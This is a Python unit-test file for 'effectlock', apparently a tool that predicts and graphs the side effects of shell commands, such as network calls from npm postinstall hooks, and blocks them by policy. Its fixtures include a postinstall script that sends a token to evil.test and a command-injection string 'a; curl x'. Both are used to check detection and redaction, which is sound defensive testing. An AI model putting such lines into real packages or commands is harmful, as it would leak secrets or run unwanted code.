import json
import os
import tempfile
import unittest
from contextlib import redirect_stderr, redirect_stdout
from io import StringIO
from pathlib import Path

from effectlock.cli import main
from effectlock.core import predict
from effectlock.graph import build_effect_graph
from effectlock.policy import PolicyConfig, evaluate_policy, load_policy
from effectlock.report import build_report


class EffectLockV020Tests(unittest.TestCase):
    def setUp(self):
        self.tmp = tempfile.TemporaryDirectory()
        self.root = Path(self.tmp.name)

    def tearDown(self):
        self.tmp.cleanup()

    def test_graph_has_transitive_source_chain(self):
        (self.root / "package.json").write_text(json.dumps({"scripts": {"postinstall": "curl https://example.test"}}))
        pred = predict("npm install", self.root)
        graph = build_effect_graph(pred)
        sources = [n for n in graph["nodes"] if n["kind"] == "source"]
        self.assertTrue(any(n["label"] == "package.json:scripts.postinstall" for n in sources))
        source_id = next(n["id"] for n in sources if n["label"] == "package.json:scripts.postinstall")
        self.assertTrue(any(e["from"] == "command" and e["to"] == source_id for e in graph["edges"]))
        self.assertTrue(any(e["from"] == source_id and e["to"] == "effect:network" for e in graph["edges"]))

    def test_cli_preserves_argv_quoting(self):
        out = StringIO()
        with redirect_stdout(out):
            code = main(["--cwd", str(self.root), "--json", "--", "git", "commit", "-m", "a; curl x"])
        self.assertEqual(code, 0)
        self.assertEqual(json.loads(out.getvalue())["command"], "git commit -m 'a; curl x'")

    def test_cli_single_string_command_is_kept_verbatim(self):
        out = StringIO()
        with redirect_stdout(out):
            main(["--cwd", str(self.root), "--json", "--", "npm install"])
        self.assertEqual(json.loads(out.getvalue())["command"], "npm install")

    def test_graph_does_not_include_script_body(self):
        secretish = "curl https://evil.test/?token=TOPSECRET"
        (self.root / "package.json").write_text(json.dumps({"scripts": {"postinstall": secretish}}))
        graph = build_effect_graph(predict("npm install", self.root))
        self.assertNotIn("TOPSECRET", json.dumps(graph))

    def test_policy_file_denies_network(self):
        (self.root / "policy.json").write_text(json.dumps({"version": 1, "deny": ["network"]}))
        cfg = load_policy(self.root, "policy.json")
        decision = evaluate_policy(predict("curl https://example.test", self.root), [], cfg)
        self.assertFalse(decision.allowed)
        self.assertEqual(decision.denied_effects, ("network",))

    def test_policy_can_deny_unknowns(self):
        cfg = PolicyConfig((), True)
        decision = evaluate_policy(predict("npm install", self.root), [], cfg)
        self.assertTrue(decision.denied_unknowns)
        self.assertFalse(decision.allowed)

    def test_policy_rejects_unknown_fields(self):
        (self.root / "policy.json").write_text(json.dumps({"deny": [], "magic": True}))
        with self.assertRaises(ValueError):
            load_policy(self.root, "policy.json")

    def test_policy_rejects_symlink(self):
        outside = self.root.parent / (self.root.name + "-policy.json")
        outside.write_text(json.dumps({"deny": ["network"]}))
        try:
            (self.root / "policy.json").symlink_to(outside)
            with self.assertRaises(ValueError):
                load_policy(self.root, "policy.json")
        finally:
            outside.unlink(missing_ok=True)

    def test_policy_rejects_hardlink(self):
        peer = self.root / "peer.json"
        peer.write_text(json.dumps({"deny": ["network"]}))
        target = self.root / "policy.json"
        os.link(peer, target)
        with self.assertRaises(ValueError):
            load_policy(self.root, "policy.json")

    def test_policy_rejects_oversized_file(self):
        (self.root / "policy.json").write_bytes(b" " * (64 * 1024 + 1))
        with self.assertRaises(ValueError):
            load_policy(self.root, "policy.json")

    def test_report_hash_is_stable(self):
        pred = predict("echo hi", self.root)
        decision = evaluate_policy(pred, [], PolicyConfig())
        a = build_report(pred, decision)
        b = build_report(pred, decision)
        self.assertEqual(a["report_sha256"], b["report_sha256"])
        self.assertIn("graph", a)
        self.assertIn("policy", a)

    def test_cli_policy_exit_code_3(self):
        (self.root / "policy.json").write_text(json.dumps({"deny": ["network"]}))
        out, err = StringIO(), StringIO()
        with redirect_stdout(out), redirect_stderr(err):
            code = main(["--cwd", str(self.root), "--policy", "policy.json", "--", "curl", "https://example.test"])
        self.assertEqual(code, 3)
        self.assertIn("blocked by policy: network", err.getvalue())

    def test_cli_graph_renders_chain(self):
        (self.root / "package.json").write_text(json.dumps({"scripts": {"postinstall": "curl https://example.test"}}))
        out = StringIO()
        with redirect_stdout(out):
            code = main(["--cwd", str(self.root), "--graph", "--", "npm", "install"])
        self.assertEqual(code, 0)
        self.assertIn("effect graph:", out.getvalue())
        self.assertIn("package.json:scripts.postinstall -> network", out.getvalue())

    def test_receipt_contains_v020_report(self):
        out = StringIO()
        with redirect_stdout(out):
            code = main(["--cwd", str(self.root), "--receipt", ".effectlock/report.json", "--", "echo", "hi"])
        self.assertEqual(code, 0)
        body = json.loads((self.root / ".effectlock" / "report.json").read_text())
        self.assertIn("graph", body)
        self.assertIn("policy", body)
        self.assertIn("report_sha256", body)


if __name__ == "__main__":
    unittest.main()
